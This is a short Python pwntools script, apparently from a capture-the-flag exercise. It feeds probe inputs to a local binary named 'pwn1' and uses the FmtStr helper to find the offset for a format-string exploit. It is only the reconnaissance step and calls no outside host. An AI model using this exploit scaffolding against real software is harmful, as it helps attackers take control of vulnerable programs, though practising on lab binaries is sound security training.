# -*- coding: utf-8 -*-
from pwn import *
#context.log_level = 'debug'
def getoffset(payload):
	p = process("./pwn1")
	p.recvuntil("input$")
	p.sendline('1')
	p.recvuntil('please input your name:\n')
	p.sendline(payload)
	info = p.recvuntil(",you")[:-4]
	p.close()
	return info
autofmt = FmtStr(getoffset)
print autofmt.offset
